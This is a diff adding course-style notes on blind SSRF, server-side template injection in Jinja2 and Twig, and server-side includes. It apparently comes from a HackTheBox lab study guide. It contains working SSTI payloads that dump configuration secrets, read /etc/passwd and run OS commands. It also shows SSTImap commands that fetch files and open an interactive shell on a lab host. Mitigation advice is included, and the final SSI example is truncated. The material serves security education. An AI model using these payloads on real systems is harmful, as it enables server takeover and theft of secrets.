@@ -191,3 +191,291 @@ gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40a
 
 ---
 ## Blind SSRF
+In many real-world **SSRF** vulnerabilities, the response is not directly displayed to us. These instances are called **blind SSRF** vulnerabilities **because we cannot see the response**. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of **blind SSRF** is generally significantly lower due to the severely restricted exploitation vectors.
+### Identifying Blind SSRF
+The sample web app behaves just like previously. We can confirm the **SSRF** vulnerability just like we did before by supplying a **URL** to a system under our control and setting up a `netcat` listener:
+```bash
+$ nc -nvlp 8000
+```
+However, if we attempt to point the web app to itself, we can see that the response does not contain the **HTML** response of the coerced request; instead, it simply lets us know that the date is unavailable. Therefore, this is a **blind SSRF** vulnerability:
+![kuva](https://hackmd.io/_uploads/Syu19KaEJe.png)
+
+### Exploiting Blind SSRF
+Exploiting **blind SSRF** is generally severely limited compared to **non-blind SSRF**. However, depending on the web app's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web app responds with `Something went wrong!` for closed ports:
+![kuva](https://hackmd.io/_uploads/BkNFqYaVke.png)
+
+However, if a port is open and responds with a valid HTTP response, we get a different error message:
+![kuva](https://hackmd.io/_uploads/rk79htp4kl.png)
+
+Depending on how the web app catches unexpected errors, we might be unable to identify running services that do not respond with valid **HTTP** responses. For instance, we are unable to identify the running **MySQL service** using this technique:
+![kuva](https://hackmd.io/_uploads/S1oR2Y6VJx.png)
+
+Furthermore, while we **cannot** read local files like before, we can use the **same technique** to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, **just like it differs for open and closed ports**:
+![kuva](https://hackmd.io/_uploads/rJ9ZTtp4yg.png)
+
+For invalid files, the error message is different:
+![kuva](https://hackmd.io/_uploads/ByWSptaNJg.png)
+
+### Prevention
+**Application Layer Mitigations:**
+* Use a whitelist to validate remote origins and prevent arbitrary requests.
+* Restrict URL schemes and protocols, either by hardcoding or using a whitelist.
+* Apply input sanitization to prevent unexpected behavior.
+
+**Network Layer Mitigations:**
+* Implement firewall rules to block outgoing requests to unauthorized systems.
+* Use network segmentation to limit access to internal systems.
+
+# SSTI
+## Template Engines
+A template engine is software that combines pre-defined templates with dynamically generated data and is often used by web apps to generate dynamic responses. An everyday use case for template engines is a website with shared headers and footers for all pages. A template can dynamically add content but keep the header and footer the same. This avoids duplicate instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Popular examples of template engines are **Jinja** and **Twig**.
+![Template-system](https://hackmd.io/_uploads/ryw2l9641l.png)
+
+### Templating
+Template engines typically require two inputs: **a template and a set of values to be inserted into the template**. The template can typically be provided as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values.
+The values are provided as key-value pairs so the template engine can place the provided value at the location in the template marked with the corresponding key. Generating a string from the input template and input values is called **rendering**.
+
+The template syntax depends on the concrete template engine used. For example, we will use the syntax used by the **Jinja template engine** throughout this section. Consider the following template string:
+````jinja2
+Hello {{ name }}!
+````
+It contains a single variable called `name`, which is replaced with a **dynamic value** during rendering. When the template is rendered, the template engine must be provided with a value for the variable name. For instance, if we provide the variable `name="vautia"` to the rendering function, it will generate the following string:
+`Hello vautia!`
+The template engine simply replaces the **variable** in the template with the **dynamic value** provided to the rendering function.
+
+While the above is a simplistic example, many modern template engines support more complex operations typically provided by programming languages, such as **conditions** and **loops**. For instance, consider the following template string:
+```jinja2
+{% for name in names %}
+Hello {{ name }}!
+{% endfor %}    
+```
+The template contains a **for-loop** that loops over all elements in a variable names. As such, we need to provide the rendering function with an object in the names variable that it can iterate over. For instance, if we pass the function with a **list** such as `names=["vautia", "21y4d", "Pedant"]`, the template engine will generate the following string:
+```
+Hello vautia!
+Hello 21y4d!
+Hello Pedant!
+```
+## Introduction to SSTI
+As the name suggests, **Server-side Template Injection (SSTI)** occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, **enabling an attacker to take over the server completely**.
+
+### Server-side Template Injection Explained
+The rendering of templates inherently deals with dynamic values provided to the template engine during rendering. Often, these dynamic values are provided by the user. 
+However, template engines can deal with user input securely if provided as values to the rendering function. That is because template engines insert the values into the corresponding places in the template and do not run any code within the values.
+**On the other hand, SSTI occurs when an attacker can control the template parameter, as template engines run the code provided in the template.**
+
+If templating is implemented correctly, user input is **always** provided to the rendering function in values and never in the template string. However, **SSTI** can occur when user input is inserted into the template **before** the rendering function is called on the template.
+
+A different instance would be if a web app calls the rendering function on the same template multiple times. If user input is inserted into the output of the first rendering process, it would be considered part of the template string in the second rendering process, potentially resulting in **SSTI**. 
+
+Lastly, web applications enabling users to modify or submit existing templates result in an obvious SSTI vulnerability.
+
+## Identifying SSTI
+We need to identify the template engine the target web app uses, as the exploitation process **highly** depends **on the concrete template engine in use**. That is because each template engine uses a slightly different syntax and supports different functions we can use for exploitation purposes.
+### Confirming SSTI
+The process of identifying an **SSTI vulnerability** is similar to the process of identifying any other injection vulnerability (i.e. **SQL Injection**). 
+
+The most effective way is to **inject special characters with semantic meaning in template engines and observe the web application's behavior**.
+
+As such, the following test string is commonly used to provoke an error message in a web app vulnerable to **SSTI**, as it consists of all special characters that have a particular semantic purpose in popular template engines:
+`
+${{<%[%'"}}%\.
+`
+Since the above test string should almost certainly violate the template syntax, **it should result in an error if the web application is vulnerable to SSTI**. This behavior is similar to how injecting a single quote **(')** into a web app vulnerable to SQL injection can break an SQL query's syntax.
+
+As a practical example, let us look at our sample web app. We can insert a name, which is then reflected on the following page:
+![kuva](https://hackmd.io/_uploads/HJmhO9a4kl.png)
+![kuva](https://hackmd.io/_uploads/rylpd9p4yl.png)
+
+To test for an **SSTI** vulnerability, we can inject the above test string (`${{<%[%'"}}%\.`). This results in the following response from the web app:
+![kuva](https://hackmd.io/_uploads/Sy60dq6E1e.png)
+As we can see, the web application throws an error. While this does not confirm that the web application is vulnerable to **SSTI**, it should increase our suspicion that the parameter might be vulnerable.
+
+### Identifying the Template Engine
+To do a successful exploitation of an **SSTI**, we first need to determine the template engine used by the web app. We can utilize slight variations in the behavior of different template engines to achieve this. 
+
+For instance, consider the following commonly used overview containing slight differences in popular template engines:
+![kuva](https://hackmd.io/_uploads/SyLEY5pEJg.png)
+<sup>Image taken from [HackTheBox](https://hackthebox.com)</sup>
+We will start by injecting the payload `${7*7}` and follow the diagram from **left to right**, depending on the result of the injection. 
+
+Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow.
+
+Injecting the payload `${7*7}` into our sample web app results in the following behavior:
+![kuva](https://hackmd.io/_uploads/HytD59aNyl.png)
+
+Since the injected payload was not executed, we follow the red arrow and now inject the payload `{{7*7}}`:
+![kuva](https://hackmd.io/_uploads/BJMF9cpNJl.png)
+
+This time, the payload was executed by the template engine. Therefore, we follow the green arrow and inject the payload `{{7*'7'}}`.
+In **Jinja**, the result will be `7777777`, while in **Twig**, the result will be `49`.
+
+## Exploiting SSTI - Jinja2
+Now that we identified a web app vulnerable to **SSTI**, we will move on to the exploitation of **SSTI**. We will assume that the web app uses the **Jinja template engine**. We will only focus on the **SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step**.
+
+**Jinja** is a template engine commonly used in **Python web frameworks** such as **Flask** or **Django**. This section will focus on a **Flask** web app. The payloads in other web frameworks might be slightly different.
+
+In our payload, **we can freely use any libraries that are already imported by the Python app**, either **directly** or **indirectly**.
+Additionally, we may be able to import additional libraries through the use of the **import** statement.
+### Information Disclosure
+We can exploit the **SSTI** vulnerability to obtain **internal information** about the web app, including configuration details and the web app's source code.
+
+For instance, we can obtain the web app's configuration using the following **SSTI** payload:
+```jinja2
+{{ config.items() }}
+```
+![kuva](https://hackmd.io/_uploads/BJYt7ia4kl.png)
+
+Since this payload dumps the entire web app configuration, including any used secret keys, we can prepare **further attacks** using the obtained information. We can also execute **Python code** to obtain information about the web app's source code. We can use the following **SSTI** payload to dump all available built-in functions:
+```jinja2   
+{{ self.__init__.__globals__.__builtins__ }}
+```
+![kuva](https://hackmd.io/_uploads/r17a7sTE1e.png)
+### Local File Inclusion (LFI)
+We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:
+```jinja2
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+![kuva](https://hackmd.io/_uploads/Syfn4ipEJg.png)
+
+### Remote Code Execution (RCE)
+To achieve remote code execution in Python, we can use functions provided by the ``os`` library, such as ``system`` or ``popen``.
+However, if the web app has not already imported this library, we must first import it by calling the built-in function ``import``. This results in the following **SSTI** payload:
+```jinja2
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+![kuva](https://hackmd.io/_uploads/SyjBLoTE1e.png)
+
+
+
+## Exploiting SSTI - Twig
+This section will discuss exploiting **SSTI** in the **Twig** template engine. Like in the previous section, we will only focus on the **SSTI** exploitation and thus assume that the **SSTI** confirmation and template engine identification have already been done in a previous step. 
+**Twig is a template engine for the PHP programming language.**
+### Information Disclosure
+In Twig, we can use the `_self` keyword to obtain a little information about the current template:
+```twig
+{{ _self }}
+```
+![kuva](https://hackmd.io/_uploads/HJKx9oT4yg.png)
+However, as we can see, the amount of information is limited compared to **Jinja**.
+### Local File Inclusion (LFI)
+Reading local files (without using the same way as we will use for **RCE**) is not possible using internal functions directly provided by **Twig**. However, the **PHP** web framework [Symfony](https://symfony.com/) defines additional **Twig** filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
+```twig
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+```
+![kuva](https://hackmd.io/_uploads/BJXNsipVJg.png)
+### Remote Code Execution (RCE)
+To achieve RCE, we can use a **PHP** built-in function such as ``system``. We can pass an argument to this function by using Twig's ``filter`` function, resulting in any of the following **SSTI** payloads:
+```twig
+{{ ['id'] | filter('system') }}
+```
+![kuva](https://hackmd.io/_uploads/ry-GK06E1l.png)
+External SSTI Cheat Sheet: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
+## SSTI Tools of the Trade
+The most popular tool for identifying and exploiting **SSTI** vulnerabilities is [tplmap](https://github.com/epinna/tplmap). **However, tplmap is not maintained anymore and runs on the deprecated Python2 version.** Therefore, we will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the **SSTI** exploitation process. We can run it after cloning the repository and installing the required dependencies:
+```bash
+$ git clone https://github.com/vladko312/SSTImap
+$ cd SSTImap
+$ pip3 install -r requirements.txt
+$ python3 sstimap.py
+-----------------------
+    ╔══════╦══════╦═══════╗ ▀█▀
+    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
+    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
+    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
+    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
+    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
+                             │ | |
+                                                |_|
+[*] Version: 1.2.0
+[*] Author: @vladko312
+[*] Based on Tplmap
+[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
+It is the end user's responsibility to obey all applicable local, state, and federal laws.
+Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
+[*] Loaded request body types: 4
+[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
+```
+To automatically identify any **SSTI** vulnerabilities as well as the template engine used by the web app, we need to provide **SSTImap** with the target **URL**:
+```bash
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
+- - - - - - - -
+SNIPPED (For visibility)
+[+] SSTImap identified the following injection point:
+
+  Query parameter: name
+  Engine: Twig
+  Injection: *
+  Context: text
+  OS: Linux
+  Technique: render
+  Capabilities:
+    Shell command execution: ok
+    Bind and reverse shell: ok
+    File write: ok
+    File read: ok
+    Code evaluation: ok, php code
+```
+As we can see, **SSTImap** confirms the **SSTI** vulnerability and successfully identifies the `Twig` template engine. It also provides capabilities we can use during exploitation. For instance, we can download a remote file to our local machine using the `-D` flag:
+```bash
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
+- - - - - -
+[+] File downloaded correctly
+```
+Additionally, we can execute a **system** command using the `-S` flag:
+```bash
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
+- - - - - -
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+Alternatively, we can use `--os-shell` to obtain an **interactive shell**:
+```bash
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
+- - - - - - 
+[+] Run commands on the operating system.
+Linux $ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Linux $ whoami
+www-data
+```
+## Preventing SSTI
+1. **Prevent SSTI Vulnerabilities**:
+- Ensure user input is never fed directly into the template engine’s rendering function.
+- Review all code paths to guarantee user input isn’t used in template parameters.
+- If users can modify or upload templates, ensure proper security measures are in place.
+- Harden the template engine to prevent attacks.
+
+2. **Remove Dangerous Functions**:
+- Disable potentially dangerous functions in the template engine to prevent remote code execution (RCE).
+- Be aware that removing dangerous functions may still leave room for bypasses.
+
+3. **Separate Execution Environment**:
+- Isolate the template engine in a separate execution environment (e.g., Docker container).
+- This minimizes the risk of compromising the web server and provides stronger security.
+# SSI 
+## Introduction to SSI
+**Server-Side Includes** (**SSI**) is a technology web apps use to create dynamic content on **HTML** pages. **SSI** is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of **SSI** can often be inferred from the **file extension**.
+
+Typical file extensions include `.shtml`, `.shtm`, and `.stm`. However, web servers can be configured to support **SSI** directives in arbitrary file extensions. As such, we cannot conclusively conclude whether **SSI** is used only from the file extension.
+### SSI Directives
+**SSI** utilizes `directives` to add dynamically generated content to a static **HTML** page. These directives consist of the following components:
+- `name`: the directive's name
+- `parameter name`: one or more parameters
+- `value`: one or more parameter values
+An **SSI directive** has the following syntax:
+```SSI
+<!--#name param1="value1" param2="value" -->
+```
+
+For instance, the following are some **common SSI directives**:
+#### printenv
+This directive **prints environment variables**. It does not take any variables.
+```SSI
+<!--#printenv -->
+```
+#### config
+This directive changes the **SSI configuration** by specifying corresponding parameters. For instance, it can be used to change the error message using the `errmsg` parameter:
+```SSI
+>
+```
